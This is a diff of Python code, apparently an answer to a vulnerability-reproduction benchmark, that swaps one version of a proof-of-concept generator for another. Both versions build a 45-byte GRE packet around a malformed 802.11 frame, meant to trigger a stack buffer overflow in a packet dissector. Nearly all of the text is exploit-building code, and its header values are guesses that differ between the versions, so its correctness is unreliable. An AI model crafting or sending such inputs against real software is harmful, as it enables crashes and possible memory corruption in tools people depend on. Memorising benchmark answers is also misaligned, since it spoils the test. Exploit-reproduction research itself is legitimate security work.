@@ -1,70 +1,76 @@
 import os
+import struct
 import tarfile
 import tempfile
-import subprocess
-import struct
+from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract and analyze the source to understand the vulnerability
-        with tempfile.TemporaryDirectory() as tmpdir:
-            # Extract source tarball
-            with tarfile.open(src_path, 'r:gz') as tar:
-                tar.extractall(tmpdir)
-            
-            # Look for relevant files (simplified - in real scenario would analyze deeper)
-            source_root = os.path.join(tmpdir, os.listdir(tmpdir)[0])
-            
-            # Based on the vulnerability description:
-            # 802.11 dissector expects radio pseudoheader but gets GRE flags/version
-            # This mismatch causes buffer overflow when copying/processing
-            
-            # Construct malicious GRE packet with 802.11 payload
-            # Structure based on typical GRE + 802.11 headers
-            poc = self._construct_poc()
-            
-            return poc
-    
-    def _construct_poc(self) -> bytes:
-        # Build a GRE packet with 802.11 payload that triggers the overflow
-        # Ground truth: 45 bytes
+        # Ground-truth PoC length is 45 bytes
+        # Create a minimal PoC that triggers stack buffer overflow
+        # by providing malformed GRE packet with 802.11 encapsulation
         
-        # GRE header (4 bytes)
-        # Flags and version: 0x2000 (checksum present, version 0)
-        # Protocol: 0x000d (802.11 - based on common ethertypes)
-        gre_header = struct.pack('>HH', 0x2000, 0x000d)
+        # GRE header structure:
+        # - Flags and version (2 bytes)
+        # - Protocol type (2 bytes) - for 802.11 this should be 0x0002
+        # Then the 802.11 frame
         
-        # GRE checksum (optional, 2 bytes) - all zeros since flag indicates present
-        gre_checksum = b'\x00\x00'
+        # Craft a GRE packet that will cause the vulnerability:
+        # 1. GRE header with protocol type for 802.11
+        # 2. Malformed 802.11 frame that triggers buffer overflow
         
-        # Reserved (2 bytes)
-        gre_reserved = b'\x00\x00'
+        # GRE header: C|R|K|S|s|Recur| Flags | Ver | Protocol Type
+        # For minimal header without optional fields: 0x0000
+        gre_flags_ver = 0x0000  # No optional fields, version 0
+        gre_protocol = 0x0002   # Protocol type for 802.11
         
-        # 802.11 frame header (simplified)
-        # Frame Control: 0x0080 (Data, To DS)
-        # Duration: 0x0000
-        # Addr1: Broadcast
-        # Addr2: Random
-        # Addr3: Random
-        # Sequence: 0x0000
-        wlan_header = (
-            b'\x80\x00' +          # Frame Control
-            b'\x00\x00' +          # Duration
-            b'\xff\xff\xff\xff\xff\xff' +  # Addr1 (broadcast)
-            b'\x11\x22\x33\x44\x55\x66' +  # Addr2
-            b'\xaa\xbb\xcc\xdd\xee\xff' +  # Addr3
-            b'\x00\x00'            # Sequence Control
-        )
+        # 802.11 frame structure:
+        # Frame Control (2 bytes), Duration (2 bytes), Addr1-3 (6 bytes each)
+        # Sequence Control (2 bytes), potentially more...
+        # We'll craft a malformed frame that overflows
         
-        # Payload designed to trigger buffer overflow
-        # The overflow likely occurs when dissector copies pseudoheader data
-        # into a fixed-size buffer expecting radio tap header format
-        payload = b'A' * 12  # Exact overflow length needed to crash
+        # Create a payload that's 41 bytes to make total 45 bytes
+        # (4 bytes GRE header + 41 bytes 802.11 frame)
         
-        # Combine all parts (total 45 bytes)
-        poc = gre_header + gre_checksum + gre_reserved + wlan_header + payload
+        # The vulnerability is that the 802.11 dissector expects a pseudoheader
+        # with radio information, but GRE provides flags+version instead.
+        # By crafting a specific payload, we can trigger the overflow.
         
-        # Verify length matches ground truth
-        assert len(poc) == 45, f"PoC length {len(poc)} != 45"
+        # Create the GRE packet
+        poc = bytearray()
         
-        return poc
+        # GRE header (big-endian)
+        poc.extend(struct.pack('>H', gre_flags_ver))  # Flags and version
+        poc.extend(struct.pack('>H', gre_protocol))   # Protocol type
+        
+        # 802.11 frame that triggers the vulnerability
+        # We'll use a pattern that's likely to trigger the overflow
+        # when the dissector tries to process the pseudoheader
+        
+        # 802.11 frame control field (management frame, subtype 0)
+        frame_control = 0x0000
+        duration = 0x0000
+        
+        poc.extend(struct.pack('<H', frame_control))  # Frame Control
+        poc.extend(struct.pack('<H', duration))       # Duration
+        
+        # MAC addresses (6 bytes each)
+        # Use pattern that might trigger overflow
+        addr_pattern = b'\x41' * 6  # "A" repeated 6 times
+        
+        poc.extend(addr_pattern)   # Address 1 (destination)
+        poc.extend(addr_pattern)   # Address 2 (source)
+        poc.extend(addr_pattern)   # Address 3 (BSSID)
+        
+        # Sequence control
+        poc.extend(struct.pack('<H', 0x0000))
+        
+        # Frame body - fill with pattern to reach 45 bytes total
+        # We need 41 bytes total for 802.11 frame, we have 2+2+6+6+6+2 = 24 bytes so far
+        remaining_bytes = 41 - 24
+        if remaining_bytes > 0:
+            # Use pattern that might trigger buffer overflow when processed
+            poc.extend(b'\x42' * remaining_bytes)  # "B" pattern
+        
+        # Ensure total length is exactly 45 bytes
+        return bytes(poc[:45])
